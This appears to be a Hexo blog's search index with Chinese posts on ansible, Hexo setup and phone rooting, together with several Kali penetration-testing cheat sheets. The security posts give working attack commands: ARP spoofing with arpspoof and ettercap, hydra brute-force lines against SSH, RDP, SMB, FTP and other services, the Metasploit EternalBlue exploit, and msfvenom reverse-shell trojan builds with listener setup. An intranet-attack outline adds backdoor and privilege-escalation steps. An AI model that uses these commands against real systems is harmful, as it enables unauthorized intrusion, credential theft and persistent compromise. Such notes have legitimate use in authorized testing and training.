<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ansible命令</title>
    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装 EPEL 仓库</p>
<pre><code>yum install epel-release -y
</code></pre>
<p>安装 Ansible</p>
<pre><code>yum install ansible -y
</code></pre>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前需要定义两个文件：<br>    一个指定需要批量执行的主机hosts.ini，可以随意指定名称；一个指定需要运行的命令和动作command.yml，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</p>
<p>hosts.ini：</p>
<pre><code>[hostst_g]
此处填写ip
[hosts_g:vars]
ansible_ssh_user=root ##账号
ansible_ssh_pass=123456 ##密码
</code></pre>
<p>command.yml：</p>
<pre><code>- name: 在远程主机上执行任意命令 
    hosts: all
    gather_facts: no
    tasks:
        - name: 执行一个特定命令
            command: echo &quot;你好，世界！&quot;
            # 使用 command 模块执行简单命令，不支持管道和重定向
        - name: 列出目录中的文件
            command: ls /path/to/directory
            # 列出指定目录中的所有文件
        - name: 使用 shell 运行包含管道的命令
            shell: echo &quot;你好，世界！&quot; | grep 你好
            # 使用 shell 模块支持管道、变量和重定向等 shell 特性
        - name: 使用 shell 特性运行命令
            shell: cat /etc/passwd | grep root
            # 通过管道过滤包含 &quot;root&quot; 的行
</code></pre>
<p>可使用shell：模拟终端上所有执行的命令。</p>
<p>使用命令</p>
<pre><code>ansible-playbook -i hosts.ini command.yml
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>运维命令</tag>
      </tags>
  </entry>
  <entry>
    <title>arp欺骗</title>
    <url>/2024/08/01/arpspoof/</url>
    <content><![CDATA[<h2 id="使用arpspoof命令："><a href="#使用arpspoof命令：" class="headerlink" title="使用arpspoof命令："></a>使用arpspoof命令：</h2><pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
</code></pre>
<p>-i interface          指定要使用的接口。<br>-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>host               指定您希望抓取数据包的host（通常是本地网关）</p>
<h2 id="使用ettercap-G-蜘蛛工具"><a href="#使用ettercap-G-蜘蛛工具" class="headerlink" title="使用ettercap -G 蜘蛛工具"></a>使用ettercap -G 蜘蛛工具</h2><p>实例演示-arp欺骗</p>
<p>1.打开ettercap，选择你要使用的网卡，点击”对号”。<br><img src="/images/pasted-4.png" alt="upload successful"></p>
<p>2.点击”搜索”按钮，进行主机发现。<br><img src="/images/pasted-5.png" alt="upload successful"></p>
<p>3.点击”红色方框里面的按钮”，我们可以查看”host list”.<br><img src="/images/pasted-6.png" alt="upload successful"></p>
<p>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。<br><img src="/images/pasted-7.png" alt="upload successful"></p>
<p>5.点击”圆圈”，选择”arp poisoning spoofing”。<br><img src="/images/pasted-8.png" alt="upload successful"></p>
<p>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。<br><img src="/images/pasted-9.png" alt="upload successful"></p>
<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br><img src="/images/pasted-10.png" alt="upload successful"></p>
<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>实战演示</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/07/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>娱乐技术</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客安装方法</title>
    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h2><p>pkg换源<br>sed -i ‘s@^(deb.*stable main)$@#\1\ndeb <a href="https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24">https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24</a> stable main@’ $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</p>
<p>pkg update</p>
<p>pkg install nodejs-lts<br>pkg install git<br>pkg install vim</p>
<p>需要在目录下运行安装<br>mkdir hexo<br>chmod 777 hexo<br>cd hexo</p>
<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>npm install hexo-cli -g<br>hexo init</p>
<p>启动命令<br>hexo g<br>hexo s</p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly</p>
<p>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
<p>vim编辑根目录下_config.yml中的theme：butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p>
<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
]]></content>
      <categories>
        <category>娱乐技术</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra命令</title>
    <url>/2024/08/01/hydra%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><pre><code>-l login 小写，指定用户名进行破解
-L file 大写，指定用户的用户名字典
-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典
-P file 大写，用于指定密码字典
-s PORT 指定默认端口
-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，批量破解
-o file 指定结果输出文件
-f 找到第一对登录名或者密码的时候中止破解
-t tasks 同时运行的线程数，默认是16
-S大写，采用SSL链接
-w time 设置最大超时时间，单位
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x 自定义密码
</code></pre>
<h2 id="爆破协议举例"><a href="#爆破协议举例" class="headerlink" title="爆破协议举例"></a>爆破协议举例</h2><p>SSH暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t -vV -o ssh.log -e ns IP ssh
</code></pre>
<p>mysql暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 5 IP mysql
</code></pre>
<p>远程桌面暴力破解</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -t 1 IP rdp
</code></pre>
<p>使用hydra破解ssh的密码</p>
<pre><code>hydra -L 用户名字典 -P 密码字典 -o ssh.log -e ns IP ssh
</code></pre>
<p>破解https：</p>
<pre><code>hydra -m /index.php -l 用户名 -P 密码字典 IP https
</code></pre>
<p>破解teamspeak：</p>
<pre><code>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
</code></pre>
<p>破解cisco：</p>
<pre><code>hydra -P 用户字典 IP cisco
hydra -m cloud -P 密码字典 IP cisco-enable
</code></pre>
<p>破解smb：</p>
<pre><code>hydra -l administrator -P 密码字典 IP smb
</code></pre>
<p>破解pop3：</p>
<pre><code>hydra -l (muts)用户名 -P 密码字典 my.pop3.mail pop3
</code></pre>
<p>破解rdp：</p>
<pre><code>hydra IP rdp -l administrator -P 密码字典 -V
</code></pre>
<p>破解http-proxy：</p>
<pre><code>hydra -l admin -P 密码字典 http-proxy://127.0.0.1
</code></pre>
<p>破解telnet</p>
<pre><code>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
</code></pre>
<p>破解ftp：</p>
<pre><code>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>msfconsole命令</title>
    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
<pre><code>apt update # 更新安装包信息；只检查，不更新
apt upgrade # 更新已安装的软件包，不删除旧包； 
apt full-upgrade # 升级包，删除旧包
</code></pre>
<p>基础使用</p>
<pre><code>msfconsole //进入框架
search  ms17_010 //使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
info //使用info查看模块信息
show options //查看参数
set  RHOST  192.168.100.158 //设置参数
exploit/run
</code></pre>
<p>辅助模块(auxiliary)</p>
<p>漏洞利用(exploit)</p>
<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
</code></pre>
<p>开启kali监听</p>
<pre><code>启动msfconsole
开启监听
    use exploit/multi/handler
设置tcp监听
    set payload windows/meterpreter/reverse_tcp
设置本机ip和端口
    set
输入explore开始监听
</code></pre>
<p>运行木马后木马上线，进入meterpreter</p>
<p>后续同上，不做详细解释</p>
<p>linux elf木马反弹shell创建（msf6版本）</p>
<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
</code></pre>
<p>监听</p>
<pre><code>msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost xxx.xxx.xxx.xxx
set lport 8888
run
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>mtk手机root</title>
    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具和手机的漏洞，连接后导出boot文件，修补后导回，完成root。</p>
<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
</code></pre>
<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
<p><img src="/images/pasted-2.png" alt="upload successful"></p>
<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
<p><img src="/images/pasted-3.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>娱乐技术</category>
      </categories>
      <tags>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap命令</title>
    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="常用命令总结"><a href="#常用命令总结" class="headerlink" title="常用命令总结"></a>常用命令总结</h2><p>命令格式</p>
<pre><code>nmap [参数] [ip]
</code></pre>
<p>主机探测（隐蔽扫描&#x2F;TCP ACK&#x2F;TCP SYN&#x2F;TCP空扫描欺骗防火墙）</p>
<pre><code>nmap -sS/-PS/-PA/-sN ip
</code></pre>
<p>命令表格</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">nmap IP</td>
<td align="center">扫描IP</td>
</tr>
<tr>
<td align="center">nmap -v IP</td>
<td align="center">加强扫描</td>
</tr>
<tr>
<td align="center">nmap IP1 IP2 …</td>
<td align="center">扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.*</td>
<td align="center">扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x,y,…</td>
<td align="center">扫描多子网地址</td>
</tr>
<tr>
<td align="center">nmap -iL xxx.txt</td>
<td align="center">根据文件扫描多IP</td>
</tr>
<tr>
<td align="center">nmap a.b.c.x-y</td>
<td align="center">扫描子网IP范围</td>
</tr>
<tr>
<td align="center">nmap a.b.c.* –exclude IP</td>
<td align="center">排除指定IP扫描整个子网</td>
</tr>
<tr>
<td align="center">nmap -A IP</td>
<td align="center">扫描操作系统和路由跟踪</td>
</tr>
<tr>
<td align="center">nmap -O IP</td>
<td align="center">探测操作系统</td>
</tr>
<tr>
<td align="center">nmap -sA&#x2F;-PN IP</td>
<td align="center">探测防火墙</td>
</tr>
<tr>
<td align="center">nmap -sP a.b.c.*</td>
<td align="center">探测在线主机</td>
</tr>
<tr>
<td align="center">nmap -F IP</td>
<td align="center">快速扫描</td>
</tr>
<tr>
<td align="center">nmap -r IP</td>
<td align="center">按顺序扫描</td>
</tr>
<tr>
<td align="center">nmap -iflist</td>
<td align="center">显示接口和路由信息</td>
</tr>
<tr>
<td align="center">nmap -p n1,n2… IP</td>
<td align="center">扫描指定端口</td>
</tr>
<tr>
<td align="center">nmap -p T:n1,n2… IP</td>
<td align="center">扫描TCP端口</td>
</tr>
<tr>
<td align="center">nmap -sU n1,n2… IP</td>
<td align="center">扫描UDP端口</td>
</tr>
<tr>
<td align="center">nmap -sV IP</td>
<td align="center">查看服务的版本</td>
</tr>
<tr>
<td align="center">nmap -PS IP</td>
<td align="center">TCP ACK扫描</td>
</tr>
<tr>
<td align="center">nmap -PA IP</td>
<td align="center">TCP SYN扫描</td>
</tr>
<tr>
<td align="center">nmap -sS IP</td>
<td align="center">隐蔽扫描</td>
</tr>
<tr>
<td align="center">nmap -sN IP</td>
<td align="center">TCP空扫描欺骗防火墙</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-内网渗透</title>
    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
